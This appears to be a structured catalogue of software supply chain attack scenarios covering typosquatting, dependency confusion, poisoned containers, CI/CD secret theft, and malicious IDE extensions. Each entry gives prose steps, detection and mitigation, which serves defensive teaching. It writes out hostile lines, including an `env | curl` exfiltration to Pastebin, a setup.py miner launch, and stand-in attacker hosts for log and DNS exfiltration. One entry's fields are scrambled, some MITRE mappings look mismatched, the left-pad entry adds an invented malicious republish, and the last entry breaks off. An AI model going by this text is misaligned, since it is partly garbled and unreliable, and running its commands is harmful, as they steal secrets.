# Supply Chain Attacks Attacks

## NPM Dependency Confusion via Internal Package Name

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines, internal apps
- **Vulnerability**: Public registry resolution takes priority over private registry
- **MITRE**: T1195.002
- **Impact**: Remote Code Execution during build
- **Tools**: npm, public NPM registry
- **Scenario**: An attacker publishes a malicious NPM package to the public registry with the same name as a private internal package, exploiting build systems that prioritize external sources.
- **Attack Steps**: 1. Attacker identifies internal package names from GitHub repos, leaked package.json, or error logs. 2. Finds a private package named @corp-utils/logger. 3. Publishes a public package named @corp-utils/logger to NPM with version 99.0.0 to override internal semver logic. 4. During a CI build, the package manager resolves to the public one due to higher versioning. 5. The public package contains obfuscated malicious code in the postinstall script, executing commands on the build server. 6. Attacker gains reverse shell access via build node.
- **Detection**: Network calls to unknown domains from build agents, unexpected new package installs
- **Solution**: Use scoped private registry enforcement, strict lockfiles, and allowlisting
- **Tags**: #npm #dependencyconfusion #supplychain

## Malicious Python Package with Clipboard Hijacker

- **Attack Type**: Malicious Library
- **Target**: Developer machines
- **Vulnerability**: Typosquatting, unvalidated dependencies
- **MITRE**: T1059.006
- **Impact**: Silent cryptocurrency theft
- **Tools**: PyPI, setup.py
- **Scenario**: A package on PyPI mimics a popular one (e.g., requests misspelled as requestss) and steals clipboard contents to hijack crypto transactions.
- **Attack Steps**: 1. Attacker registers a fake package on PyPI called requestss. 2. In setup.py, they include a base64-encoded script that gets executed on install. 3. The script monitors the clipboard every 3 seconds. 4. If it detects a crypto wallet address, it replaces it with the attacker’s address. 5. Developer unknowingly installs requestss instead of requests. 6. On install, the payload runs, and clipboard hijacking begins silently.
- **Detection**: Clipboard activity patterns, user reports, malicious setup.py analysis
- **Solution**: Always verify package names, use hash pinning and trusted indexes
- **Tags**: #pypi #crypto #clipboard

## Fake GitHub Action Pulls Malicious NPM Package

- **Attack Type**: CI/CD Injection
- **Target**: GitHub CI/CD pipelines
- **Vulnerability**: Trusting unverified Actions and deps
- **MITRE**: T1056.001
- **Impact**: Secrets exfiltration from CI
- **Tools**: GitHub Actions, NPM
- **Scenario**: A GitHub Action is crafted to seem legitimate but injects a malicious dependency that steals secrets.
- **Attack Steps**: 1. Attacker creates a GitHub Action called action-node-setup-v3, mimicking an official one. 2. Inside the Action, it installs a dependency fast-logger, which contains a backdoor. 3. A victim repo adds the Action assuming it's official. 4. During CI runs, fast-logger executes and grabs environment variables (secrets, tokens). 5. Secrets are sent to the attacker's webhook. 6. The attacker uses stolen secrets for lateral movement or API abuse.
- **Detection**: Analyze GitHub Actions for unknown publishers, monitor webhook traffic
- **Solution**: Only use verified Actions, scan CI for sensitive env var access
- **Tags**: #github #cicd #dependencyattack

## PyPI Dependency Includes Hidden Reverse Shell

- **Attack Type**: Malicious Library
- **Target**: Backend web servers
- **Vulnerability**: Hidden payload in binary extension
- **MITRE**: T1203
- **Impact**: Remote access to host system
- **Tools**: PyPI, Cython
- **Scenario**: A developer adds a dependency from PyPI that appears helpful but includes a reverse shell hidden in compiled code.
- **Attack Steps**: 1. Attacker publishes a PyPI package called string-utils-plus which includes Cython-compiled .so file. 2. The codebase looks clean, but compiled object contains reverse shell logic triggered during import. 3. Developer adds it to their web backend for text formatting. 4. On import string_utils_plus, reverse shell connects to attacker. 5. Attacker gains access to web host and begins lateral movement.
- **Detection**: Monitor unknown .so loads, network traffic during imports
- **Solution**: Avoid obscure dependencies; audit even compiled artifacts
- **Tags**: #pypi #cython #reverseshell

## NPM postinstall Script Mines Crypto

- **Attack Type**: Malicious Library
- **Target**: Developer laptops
- **Vulnerability**: Abuse of lifecycle hooks
- **MITRE**: T1496
- **Impact**: Resource exhaustion, cryptojacking
- **Tools**: npm, Node.js
- **Scenario**: A malicious NPM package abuses the postinstall script to start CPU-intensive crypto mining on developer machines.
- **Attack Steps**: 1. Attacker publishes a package env-pretty with useful formatting tools. 2. package.json includes a postinstall script that silently installs a Monero mining script and runs it in the background. 3. Developer installs the package globally (npm i -g env-pretty). 4. Mining process starts with nice system priority to stay hidden. 5. CPU usage spikes; electricity wasted and system slows down.
- **Detection**: Monitor CPU usage patterns after installs
- **Solution**: Disable scripts on install via --ignore-scripts
- **Tags**: #npm #cryptomining #postinstall

## Transitive Dependency Exploit via Trusted Lib

- **Attack Type**: Transitive Dependency Injection
- **Target**: Popular app framework indirectly affected
- **Vulnerability**: Transitive dependency trust
- **MITRE**: T1195.002
- **Impact**: Info leakage, RCE in indirect consumers
- **Tools**: NPM, Yarn
- **Scenario**: An attacker injects malware into a lesser-known library that is a dependency of a popular trusted package.
- **Attack Steps**: 1. Attacker forks a rarely maintained package (tiny-buffer) used by a larger framework (super-server). 2. Injects malicious code into tiny-buffer, publishes it under the same name but higher semver. 3. super-server unintentionally upgrades to new version via semver mismatch. 4. Malicious code activates during server startup, leaking system info to attacker.
- **Detection**: Use yarn.lock or package-lock.json diff tools
- **Solution**: Freeze dependencies and audit transitive deps
- **Tags**: #npm #transitive #supplychain

## Compromised Developer Pushes Malicious Update

- **Attack Type**: Insider Threat
- **Target**: Projects using fastjson
- **Vulnerability**: Credential theft and unauthorized publish
- **MITRE**: T1078
- **Impact**: Data exfiltration at scale
- **Tools**: PyPI, Maintainer Access
- **Scenario**: A maintainer’s credentials are compromised and attacker pushes a new version with backdoor.
- **Attack Steps**: 1. Attacker steals credentials via phishing of a package maintainer. 2. Logs into PyPI and uploads version 2.0.1 with malicious code in the main logic path. 3. Package fastjson is auto-updated by thousands of projects. 4. Backdoor collects ENV data and posts to attacker domain.
- **Detection**: Sudden version spike with new telemetry
- **Solution**: Enforce 2FA on package accounts, use mirrors
- **Tags**: #pypi #insider #maintainercompromise

## Terraform Provider Downloads Tampered Binary

- **Attack Type**: Infrastructure Dependency Injection
- **Target**: DevOps teams
- **Vulnerability**: Impersonated provider source
- **MITRE**: T1203
- **Impact**: Compromised infra setup
- **Tools**: Terraform, GitHub
- **Scenario**: A malicious Terraform provider is uploaded to the registry, shipping a precompiled tampered binary.
- **Attack Steps**: 1. Attacker forks a real Terraform provider (terraform-provider-aws-custom) and adds malicious code to the binary. 2. Publishes it with similar name on Terraform registry. 3. Devs use source = "attacker/aws-custom" thinking it's official. 4. On terraform init, binary is downloaded and executed. 5. Backdoor logs system metadata and opens reverse shell.
- **Detection**: Monitor provider source fields, binary diff
- **Solution**: Use verified sources only, checksum binaries
- **Tags**: #terraform #cloud #supplychain

## Fake RubyGem Sends HTTP Logs to Attacker

- **Attack Type**: Malicious Library
- **Target**: Ruby applications
- **Vulnerability**: Typosquatting, logging exfiltration
- **MITRE**: T1005
- **Impact**: Leak of credentials and debug data
- **Tools**: RubyGems
- **Scenario**: A fake RubyGem mimics colorize gem and sends all logs and environment variables to a webhook.
- **Attack Steps**: 1. Attacker uploads colourize gem (UK spelling) to RubyGems. 2. In the gem code, all stdout and logs are piped to an external server. 3. Developer uses it in a Rails project thinking it’s the same as colorize. 4. Secrets, ENV variables, and tokens are logged to attacker's webhook.
- **Detection**: Monitor logs sent over HTTP during dev
- **Solution**: Carefully review Gemfile deps, monitor DNS exfil
- **Tags**: #rubygems #logleak #typosquat

## Dockerfile Pulls Compromised Base Image

- **Attack Type**: Container Supply Chain
- **Target**: Containers
- **Vulnerability**: Misleading registry source
- **MITRE**: T1608.006
- **Impact**: Remote container access
- **Tools**: Docker, Docker Hub
- **Scenario**: A base image pulled in Dockerfile (node:14) is replaced with a malicious variant on an unofficial registry.
- **Attack Steps**: 1. Attacker creates a public registry that mirrors node:14 but includes hidden backdoor in /usr/bin/ssh. 2. Publishes it under docker.io/public-node:14. 3. Victim Dockerfile mistakenly pulls from this instead of official. 4. Backdoor allows attacker to SSH into any container built from this image.
- **Detection**: Monitor base image hashes, registry URLs
- **Solution**: Use trusted, verified registries only
- **Tags**: #docker #imagebackdoor #containers

## NPM Token Stealer Hidden in Preinstall

- **Attack Type**: Malicious Library
- **Target**: Developer systems
- **Vulnerability**: Token leakage via local config read
- **MITRE**: T1557.003
- **Impact**: Internal package compromise
- **Tools**: npm, Node.js
- **Scenario**: A malicious NPM package harvests .npmrc auth tokens using a preinstall hook and exfiltrates them.
- **Attack Steps**: 1. Attacker publishes a package named color-themes to NPM. 2. Inside package.json, a preinstall script runs a Node.js script that reads ~/.npmrc file. 3. The script captures the user's NPM authentication token. 4. It base64-encodes the token and sends it to a remote server via HTTPS. 5. If the token is for an org-scoped private registry, attacker gains publish access. 6. Attacker later pushes poisoned packages to internal registries using stolen token.
- **Detection**: Monitor outbound connections during package installs
- **Solution**: Restrict token scopes, disable preinstall with --ignore-scripts
- **Tags**: #npm #tokenstealing #authleak

## Malicious Java Dependency via Maven Typo

- **Attack Type**: Malicious Library
- **Target**: Java web applications
- **Vulnerability**: Typo in groupId leads to backdoor import
- **MITRE**: T1055
- **Impact**: Persistent remote access via classloader
- **Tools**: Maven Central, Java
- **Scenario**: A malicious JAR file is uploaded to a public Maven repo under a mistyped groupId, tricking devs.
- **Attack Steps**: 1. Attacker creates a JAR and uploads it as org.springfamework:spring-webmvc (note typo). 2. Inside the JAR is a class with static initializer that runs during class loading and opens a remote socket. 3. Developer accidentally adds the typo'd dependency into pom.xml. 4. On app startup, socket connects to attacker-controlled server. 5. Attacker now has a persistent communication channel into the JVM.
- **Detection**: Detect unknown groupIds, runtime socket connections
- **Solution**: Use Maven repository mirrors, enforce groupId validation
- **Tags**: #maven #javabackdoor #pomtypo

## Compromised JS Logger Package Logs to External API

- **Attack Type**: Data Exfiltration
- **Target**: Production apps
- **Vulnerability**: Malicious side-effects in libraries
- **MITRE**: T1005
- **Impact**: Sensitive log leakage, data correlation
- **Tools**: Node.js, npm
- **Scenario**: An attacker introduces a logger package that silently mirrors all logs to an external API endpoint.
- **Attack Steps**: 1. Attacker creates a logging helper library called json-log-enhancer. 2. While it formats logs, it also sends every log message to an external API (e.g., attacker.com/api/logs). 3. Devs add it to apps assuming it's just a formatting lib. 4. Sensitive logs with access tokens, emails, and errors are leaked to attacker. 5. Attacker aggregates leaked data and maps user behavior across apps.
- **Detection**: Monitor DNS or HTTP requests in logging libraries
- **Solution**: Audit all third-party loggers, mask sensitive data
- **Tags**: #logging #dataleak #npm

## GitHub Package Registry Used for Typosquatting

- **Attack Type**: Dependency Confusion
- **Target**: GitHub CI/CD workflows
- **Vulnerability**: Package name typo fetches malicious version
- **MITRE**: T1195.002
- **Impact**: CI secrets stolen and abused
- **Tools**: GitHub Packages
- **Scenario**: A typo-squatted package uploaded to GitHub Package Registry targets internal GitHub Actions.
- **Attack Steps**: 1. Attacker identifies internal GitHub Action referencing org/internal-utils. 2. They upload org/internal-utlis (misspelled) to GitHub Package Registry. 3. Developer mistypes the name in workflow.yml. 4. During CI build, malicious package is fetched and installed. 5. The package includes script that captures GitHub secrets via process.env. 6. Secrets sent to attacker via webhook.
- **Detection**: Detect unknown registry access during builds
- **Solution**: Use GitHub org allowlisting and spelling lint rules
- **Tags**: #github #packageconfusion #cicd

## NPM Package Mimics Browser Plugin

- **Attack Type**: Malicious Library
- **Target**: Dev workstations, browser testing infra
- **Vulnerability**: Background install of extension via CLI tool
- **MITRE**: T1176
- **Impact**: Browser session compromise
- **Tools**: npm, Puppeteer
- **Scenario**: A Node.js package mimics browser automation tools and installs an actual malicious Chrome extension.
- **Attack Steps**: 1. Attacker publishes chrome-helpers that wraps around Puppeteer. 2. During installation, it downloads and installs a Chrome extension via a background script. 3. The extension requests all tab and history permissions. 4. It spies on all browser activity, injecting ads or stealing session cookies. 5. Developer uses the package in headless browser automation and doesn't notice.
- **Detection**: Monitor Chrome extension installs outside store
- **Solution**: Disable programmatic installs, use extension policies
- **Tags**: #browsers #npm #chrome

## CI/CD Build Injects Data Leak via ENV Variable

- **Attack Type**: CI/CD Dependency Injection
- **Target**: curl -d @- pastebin.com`. 3. Developer includes it in CI build to standardize environment logging. 4. Build logs are now published with secrets included. 5. Attacker scrapes Pastebin and aggregates tokens.
- **Vulnerability**: CI runners
- **MITRE**: Shell-based ENV leak in CI build
- **Impact**: T1552
- **Tools**: GitHub Actions, Bash, Curl
- **Scenario**: A malicious dependency in CI build scripts exports secrets to a public Pastebin via shell trickery.
- **Attack Steps**: 1. Attacker adds export-env package to NPM with a useful shell wrapper. 2. In the package, index.js silently runs `env
- **Detection**: Leaked environment secrets
- **Solution**: Detect outgoing pastebin or curl connections in CI
- **Tags**: Use env redaction, restrict external outbound URLs in CI

## PyPI Setup File Includes Crypto Miner

- **Attack Type**: Malicious Library
- **Target**: Developer laptops
- **Vulnerability**: Abuse of setup.py script
- **MITRE**: T1496
- **Impact**: CPU abuse, electricity cost, DoS
- **Tools**: PyPI, Python
- **Scenario**: A PyPI package includes a cryptocurrency miner hidden inside its setup.py script.
- **Attack Steps**: 1. Attacker publishes fast-datetime to PyPI. 2. setup.py contains os.system("nohup ./xmrig &"). 3. When user installs via pip install, miner is started in background. 4. It uses CPU resources silently with no visible output. 5. Users experience performance drops but cannot trace the cause easily.
- **Detection**: Monitor for high CPU post-install, hash match scripts
- **Solution**: Ban os.system in setup.py; enforce clean builds
- **Tags**: #pypi #miner #setupabuse

## LeftPad-like Removal Causes Downstream Crashes

- **Attack Type**: Dependency Removal
- **Target**: Public web services
- **Vulnerability**: Registry dependency fragility
- **MITRE**: T1195.002
- **Impact**: Widespread outage and code execution
- **Tools**: npm
- **Scenario**: Maintainer unpublishes a tiny but widely used package, causing thousands of apps to break.
- **Attack Steps**: 1. Original maintainer of left-pad unpublishes it due to legal/ethical conflict. 2. Every app depending on left-pad breaks builds. 3. Attacker rushes to publish a new left-pad with malicious code. 4. Many systems auto-install the new version assuming continuity. 5. Backdoor logic logs ENV, steals .env secrets, and disables security logging.
- **Detection**: Monitor newly published packages with reused names
- **Solution**: Lock dependencies, mirror critical packages internally
- **Tags**: #leftpad #npm #supplychainoutage

## DockerHub Image Pull Contains Alpine Backdoor

- **Attack Type**: Container Supply Chain
- **Target**: Container deployments
- **Vulnerability**: Backdoor in base image
- **MITRE**: T1608.006
- **Impact**: Credential theft via fake image
- **Tools**: DockerHub
- **Scenario**: Attacker publishes alpine:3.15 image with trojaned SSH binary that logs credentials.
- **Attack Steps**: 1. Attacker uploads modified alpine base image named alpine:3.15-lts. 2. Inside, SSH binary logs creds to /tmp/.sshlog. 3. DevOps team uses this image believing it's an official LTS variant. 4. In production, SSH usage logs root credentials in plaintext. 5. Attacker scrapes containers via a second-stage script.
- **Detection**: Compare image digests, hash match system binaries
- **Solution**: Use image signing, avoid non-official tags
- **Tags**: #docker #ssh #imagebackdoor

## VS Code Extension Pulls JS Dependency With RCE

- **Attack Type**: Extension Supply Chain
- **Target**: Developer IDEs
- **Vulnerability**: Unverified external scripts in IDE extension
- **MITRE**: T1176
- **Impact**: Remote code execution via IDE
- **Tools**: VS Code, npm CDN
- **Scenario**: A VS Code extension loads a malicious JS library from CDN with embedded RCE payload.
- **Attack Steps**: 1. Attacker submits Prettify Pro VS Code extension. 2. In its main.js, it loads https://cdn-attacker.com/pretty.min.js. 3. The script includes eval() that executes base64'd code sent by attacker. 4. Once installed, the extension phones home and receives RCE commands. 5. Attacker uses it to plant backdoors or run local shell commands.
- **Detection**: Monitor extension script origins, audit eval usage
- **Solution**: Disallow remote eval; whitelist extension behavior
- **Tags**: #vscode #extensionrce #cdn

## NPM Package Harvests AWS Credentials from Build Agents

- **Attack Type**: Malicious Library
- **Target**: CI/CD runners
- **Vulnerability**: Lack of egress control and script trust in builds
- **MITRE**: T1552
- **Impact**: Full compromise of AWS environments
- **Tools**: NPM, Node.js, GitHub Actions
- **Scenario**: A malicious NPM package is designed to silently extract AWS credentials from CI build containers and exfiltrate them.
- **Attack Steps**: 1. The attacker publishes an NPM package named aws-helper-utils, which mimics naming patterns of legit internal libraries. 2. Inside the postinstall script, a Node.js script is triggered that reads environment variables like AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY. 3. The script base64-encodes these credentials and sends them via HTTPS POST to a malicious server. 4. A target project’s CI pipeline includes this library during automated builds. 5. During pipeline execution, the malicious script runs and successfully exfiltrates live credentials. 6. The attacker now has access to the cloud environment, allowing further enumeration and potential privilege escalation.
- **Detection**: Monitor outgoing requests and secrets access in build containers
- **Solution**: Block untrusted domains, restrict access to secrets via scoped credentials
- **Tags**: #aws #npm #supplychain #ci

## Malicious Dependency Spoofs Internal Python Toolkit

- **Attack Type**: Dependency Confusion
- **Target**: Remote developer endpoints
- **Vulnerability**: Misconfigured private/public index priorities
- **MITRE**: T1195.002
- **Impact**: Initial access to corporate devices
- **Tools**: PyPI, pip
- **Scenario**: A PyPI package with a spoofed internal toolkit name is published, compromising internal scripts when dependency resolution fails.
- **Attack Steps**: 1. Attacker publishes a Python package named corp-infra-toolkit, knowing an enterprise internally uses a package by that name. 2. The attacker gives it a much higher version (100.0.0) to ensure it is resolved first by pip in case of network fallback. 3. The package contains a payload in __init__.py that runs a reverse shell when imported. 4. A developer working remotely without access to the internal index runs pip install corp-infra-toolkit. 5. pip pulls the malicious public version and installs it silently. 6. Once any script uses the toolkit, the payload triggers and attacker gains shell access to dev machine.
- **Detection**: Monitor pip logs and external requests, audit public package resolutions
- **Solution**: Enforce index URL restrictions, use --extra-index-url wisely
- **Tags**: #pypi #dependencyconfusion #remoteaccess

## Compromised JavaScript Package with Dynamic DNS Beaconing

- **Attack Type**: Malicious Library
- **Target**: Internal production apps
- **Vulnerability**: Covert DNS channel used for recon
- **MITRE**: T1046
- **Impact**: Infrastructure reconnaissance
- **Tools**: NPM, Node.js
- **Scenario**: A malicious JavaScript package uses DNS to stealthily beacon victim identifiers to attacker infrastructure without triggering HTTP alerts.
- **Attack Steps**: 1. Attacker creates a seemingly harmless NPM utility package (uuid-plus), used for UUID generation and formatting. 2. The index.js script includes dynamic DNS requests like victim_id.attacker.com, where victim_id is system hostname. 3. When the module is loaded, the request is sent using dns.lookup() silently. 4. Organizations install the package into production apps assuming it’s a basic utility. 5. The attacker monitors incoming DNS queries and maps victim infrastructure without detection. 6. Over time, a passive footprint of infected apps builds for later exploitation.
- **Detection**: Monitor suspicious DNS patterns, especially subdomain enumeration
- **Solution**: Use DNS egress filtering, audit small utility libraries
- **Tags**: #npm #dnsbeaconing #covertchannel

## Jenkins Build Loads Malicious Gradle Plugin

- **Attack Type**: CI/CD Plugin Poisoning
- **Target**: Build servers
- **Vulnerability**: Lack of plugin source validation
- **MITRE**: T1059
- **Impact**: Internal secrets theft and pivoting
- **Tools**: Jenkins, Gradle
- **Scenario**: A Jenkins pipeline is configured to use a malicious Gradle plugin that executes shell commands upon build.
- **Attack Steps**: 1. Attacker publishes a Gradle plugin called com.gradle.shadowplugin to a public Maven repo. 2. The plugin includes a class that overrides apply(Project) and runs arbitrary shell commands during the build. 3. A misconfigured Jenkins job allows plugins from public sources and adds this one to simplify builds. 4. During execution, the plugin writes .bash_history, .ssh, and ENV vars to a file and uploads it via curl. 5. Attacker now has access to Jenkins node credentials and cached SSH keys. 6. This can allow horizontal movement within internal infrastructure.
- **Detection**: Monitor all plugin code sources and execution logs
- **Solution**: Lock plugin repositories and verify plugin signatures
- **Tags**: #gradle #jenkins #pluginabuse

## RubyGem Executes Malicious eval on Install

- **Attack Type**: Malicious Library
- **Target**: Developer laptops
- **Vulnerability**: Abuse of gem install hooks and eval
- **MITRE**: T1203
- **Impact**: Credential and key exfiltration
- **Tools**: RubyGems, Ruby
- **Scenario**: A RubyGem hides base64-encoded Ruby code within itself and evaluates it on install to execute arbitrary commands.
- **Attack Steps**: 1. Attacker creates a gem named json-helper-kit, targeting developers who need JSON parsing tools. 2. Inside the gemspec, they include an encoded payload like eval(Base64.decode64(...)) in the post-installation hook. 3. On gem install, Ruby automatically evaluates the script. 4. The payload exfiltrates the contents of ~/.aws/credentials and SSH keys. 5. This data is sent to attacker-controlled servers silently. 6. Attacker uses the stolen credentials for AWS API access and SSH brute force attempts.
- **Detection**: Monitor gem install behavior, block encoded payloads in hooks
- **Solution**: Use sandboxed environments for gem testing and installs
- **Tags**: #rubygems #evalabuse #credentialtheft

## Docker Compose Pulls Infected Redis Image

- **Attack Type**: Container Supply Chain
- **Target**: Containerized apps
- **Vulnerability**: Supply chain via image tag confusion
- **MITRE**: T1608.006
- **Impact**: Secret exfiltration from memory
- **Tools**: Docker Compose, Redis
- **Scenario**: A docker-compose.yml file references a Redis image that has a built-in TCP listener for exfiltration.
- **Attack Steps**: 1. Attacker publishes a public image evil-redis:6.2.5 to DockerHub, appearing identical to the original. 2. Inside, they add a background process that reads from Redis memory and sends it via TCP every 60 seconds. 3. A project accidentally uses evil-redis:6.2.5 in its docker-compose.yml. 4. The infected container spins up with the project and leaks data such as keys, session tokens, and configs. 5. The attacker captures this data for later misuse or credential stuffing.
- **Detection**: Monitor for non-standard Redis processes and unexpected outbound TCP
- **Solution**: Pin base image digests; use only verified maintainers
- **Tags**: #docker #redis #memoryleak

## Supply Chain Poisoning via NuGet .NET Package

- **Attack Type**: Malicious Library
- **Target**: Windows backend systems
- **Vulnerability**: Native DLL backdoor inside package
- **MITRE**: T1055.001
- **Impact**: RCE with high privileges
- **Tools**: NuGet, PowerShell
- **Scenario**: A malicious NuGet package for .NET includes hidden DLLs that invoke PowerShell reverse shell on Windows systems.
- **Attack Steps**: 1. Attacker uploads a NuGet package Company.Helpers.NetCore mimicking corporate-style naming. 2. The .nuspec file lists seemingly safe dependencies, but the package includes a native DLL in lib/netstandard2.0/. 3. When the DLL is loaded, it triggers a PowerShell one-liner reverse shell that connects to the attacker. 4. The package gets included in a legacy backend system update. 5. Once deployed, the DLL executes on service start and connects back to the attacker with SYSTEM privileges.
- **Detection**: Monitor new DLLs in .nuget cache; track PowerShell calls
- **Solution**: Restrict native binaries in packages; enable strict policy analysis
- **Tags**: #nuget #dllinject #powershell

## Obfuscated Crypto Mining in NPM Build Script

- **Attack Type**: Resource Hijacking
- **Target**: Dev environments
- **Vulnerability**: Obfuscation hides mining behavior
- **MITRE**: T1496
- **Impact**: Resource abuse, device slowdown
- **Tools**: Node.js, npm
- **Scenario**: An NPM library’s build process runs a deeply obfuscated script that launches a stealthy CPU miner.
- **Attack Steps**: 1. Attacker uploads websocket-enhancer with actual useful features to gain stars/downloads. 2. build.js uses heavily obfuscated code (via eval and String.fromCharCode) to disguise its intent. 3. On running npm run build, the code executes and downloads a cryptominer from a remote server. 4. It runs in the background with a renamed binary to avoid detection (.cache/logrotate). 5. System CPU usage gradually increases but is difficult to trace back to the dependency.
- **Detection**: Monitor obfuscated scripts and analyze build steps
- **Solution**: Block eval usage; scan builds for non-standard binaries
- **Tags**: #npm #obfuscation #cryptominer

## Cross-Registry NPM Attack Exploits Scoped Package Confusion

- **Attack Type**: Dependency Confusion
- **Target**: Internal dev environments
- **Vulnerability**: Private/public scope confusion
- **MITRE**: T1195.002
- **Impact**: Credential exfiltration and build compromise
- **Tools**: npm, Verdaccio
- **Scenario**: Attacker publishes a scoped NPM package in the public registry which conflicts with private registry resolution logic.
- **Attack Steps**: 1. Company uses scoped packages like @company/logger hosted on a private registry. 2. Attacker publishes @company/logger publicly on NPM with version 999.0.0. 3. Misconfigured .npmrc doesn’t enforce registry rules properly. 4. Public package gets pulled during install and executes a postinstall script to upload secrets. 5. Attack goes unnoticed because the scoped name seemed internal and trustworthy.
- **Detection**: Audit package sources during install; verify registries
- **Solution**: Lock registries by scope in .npmrc
- **Tags**: #npm #scoped #registryconfusion

## CI Artifact Contains Tampered Python Wheel

- **Attack Type**: CI/CD Artifact Poisoning
- **Target**: Devs using CI artifacts
- **Vulnerability**: Tampered build artifacts
- **MITRE**: T1609
- **Impact**: Compromise via trusted artifact
- **Tools**: GitHub Actions, PyPI, pip
- **Scenario**: A Python wheel published as a build artifact is tampered with to include a malicious post-install script.
- **Attack Steps**: 1. Attacker compromises CI runner or uses a PR to inject tampered wheel build logic. 2. The resulting .whl file includes a script that runs on pip install, uploading SSH keys and .env contents. 3. Developer pulls artifact from GitHub Releases thinking it’s clean. 4. Installing it triggers the malicious script, compromising credentials. 5. Attacker uses creds to gain access to internal Git repos and cloud services.
- **Detection**: Hash verify all build artifacts; sign release binaries
- **Solution**: Use isolated build runners; audit release workflows
- **Tags**: #ciartifact #wheel #pypi

## NPM Package Drops Keylogger via Node-Gyp

- **Attack Type**: Malicious Library
- **Target**: Developer systems
- **Vulnerability**: Native code execution via build hooks
- **MITRE**: T1056.001
- **Impact**: Credential/keylogging on dev machines
- **Tools**: npm, node-gyp, C++
- **Scenario**: A malicious Node.js package uses node-gyp to compile and drop a keylogger binary during install.
- **Attack Steps**: 1. Attacker creates a package term-style-utils which claims to provide terminal UI enhancements. 2. Within the package, a binding.gyp file is included to compile a native addon. 3. The compiled C++ code is disguised but functions as a keylogger that hooks into keyboard events. 4. When installed via npm install, the addon is built using node-gyp silently. 5. The keylogger starts monitoring all keystrokes and writes logs to a hidden file in the user’s home directory. 6. Attacker collects these logs through a follow-up callback connection.
- **Detection**: Monitor native builds and file write operations during install
- **Solution**: Disable native builds for untrusted packages
- **Tags**: #npm #nodegyp #keylogger

## PyPI Package Extracts Browser Session Cookies

- **Attack Type**: Malicious Library
- **Target**: Developer endpoints
- **Vulnerability**: Access to browser files from local Python env
- **MITRE**: T1539
- **Impact**: Session hijacking and impersonation
- **Tools**: PyPI, Python
- **Scenario**: A fake PyPI package steals browser session cookies by accessing user profile directories.
- **Attack Steps**: 1. Attacker publishes a package requests-browser-addon, pretending to extend the requests module. 2. The package includes Python code that locates browser profiles (Chrome/Edge/Firefox) based on OS. 3. It opens and extracts session cookies stored in SQLite files using sqlite3 module. 4. The data is encoded and sent to an attacker-controlled server. 5. Developers using the package for HTTP tasks unknowingly expose their browser session tokens. 6. Attacker uses these sessions to impersonate users on critical platforms (e.g., GitHub, AWS Console).
- **Detection**: Monitor file access to browser directories
- **Solution**: Restrict dev access to sensitive local files; run Python in sandbox
- **Tags**: #pypi #cookiehijack #browsers

## Malicious VS Code Snippet Sync Extension

- **Attack Type**: Extension Supply Chain
- **Target**: Developer IDEs
- **Vulnerability**: Over-permissive IDE extensions
- **MITRE**: T1005
- **Impact**: Source code and secret theft
- **Tools**: VS Code, JavaScript
- **Scenario**: A fake VS Code extension marketed for snippet syncing uploads entire codebase and secrets to attacker.
- **Attack Steps**: 1. Attacker builds a VS Code extension called SnippetSync Pro, claiming to sync snippets across devices. 2. It requests file system access and uploads the contents of open projects using fetch() to attacker-controlled API. 3. Users install it from the Marketplace without reading permissions. 4. Once activated, it silently scans for .env, .aws, credentials.json, and config.yml. 5. All such files are sent to attacker infrastructure for analysis. 6. The attacker now holds credentials, cloud configs, and source code.
- **Detection**: Monitor extension behavior; restrict file access APIs
- **Solution**: Only install extensions from verified publishers
- **Tags**: #vscode #extensionleak #snippet

## GitHub Action Replaces Build Artifact with Malware

- **Attack Type**: CI/CD Pipeline Manipulation
- **Target**: OSS projects using GitHub Releases
- **Vulnerability**: Artifact tampering via unverified CI components
- **MITRE**: T1609
- **Impact**: Release-level backdoor distribution
- **Tools**: GitHub Actions, npm
- **Scenario**: A malicious GitHub Action tampered with build artifacts and replaced them with trojanized versions.
- **Attack Steps**: 1. Attacker submits a PR to a public repo, referencing a custom GitHub Action in their fork. 2. The Action runs build steps and uploads a JavaScript artifact as release output. 3. In the Action’s logic, attacker replaces the generated artifact with a trojanized version containing obfuscated code. 4. Maintainer merges the PR, unaware of artifact poisoning. 5. Users downloading the release are exposed to backdoored code that exfiltrates ENV variables on execution.
- **Detection**: Monitor artifact integrity using hashes/signatures
- **Solution**: Enforce use of internal or signed Actions only
- **Tags**: #githubactions #releasepoisoning #cicd

## Malicious Golang Module Injects DNS Recon

- **Attack Type**: Malicious Library
- **Target**: Cloud apps using Go modules
- **Vulnerability**: Covert data exfiltration using DNS
- **MITRE**: T1046
- **Impact**: Reconnaissance and staging
- **Tools**: Golang, Go Modules
- **Scenario**: A Go module uses net.LookupHost() to send encoded hostnames and IPs as DNS queries to attacker-controlled domains.
- **Attack Steps**: 1. Attacker uploads github.com/fakeorg/utils-netgo with common net helpers. 2. One function collects system hostname, IP, and container ID. 3. These are appended to a crafted subdomain and queried via DNS: e.g., host123_ip10_0_0_1.attacker.com. 4. The attacker captures these DNS requests via their domain’s nameserver. 5. The victim team uses the Go module in their containerized apps. 6. Without HTTP traffic, attacker still maps targets passively.
- **Detection**: Monitor DNS queries for non-whitelisted domains
- **Solution**: Use go.sum verification and domain whitelisting
- **Tags**: #golang #dnsrecon #modules

## DockerHub MySQL Image with Root Account Enabled

- **Attack Type**: Container Supply Chain
- **Target**: Exposed cloud containers
- **Vulnerability**: Insecure image default credentials
- **MITRE**: T1078.001
- **Impact**: Full DB compromise and data theft
- **Tools**: DockerHub, MySQL
- **Scenario**: A tampered DockerHub MySQL image has a pre-created root account with static password allowing remote access.
- **Attack Steps**: 1. Attacker publishes mysql-enterprise:5.7 image to DockerHub, mimicking real naming conventions. 2. The container image includes a startup script that sets root password as Welcome123 and binds MySQL to 0.0.0.0. 3. A DevOps team includes this image in a docker-compose.yml without verifying the source. 4. Once deployed, attacker scans IP ranges and locates exposed ports. 5. Using the known password, they gain full access to the MySQL database.
- **Detection**: Monitor bind addresses and port exposure in cloud
- **Solution**: Use only signed and verified base images
- **Tags**: #docker #mysql #imagebackdoor

## Public PyPI Wheel Includes Keylogger in C Extension

- **Attack Type**: Malicious Library
- **Target**: Developer laptops
- **Vulnerability**: Hidden keylogger via compiled extension
- **MITRE**: T1056
- **Impact**: Credential theft at runtime
- **Tools**: PyPI, Python C API
- **Scenario**: A PyPI wheel includes a C extension compiled to record keystrokes when the module is imported.
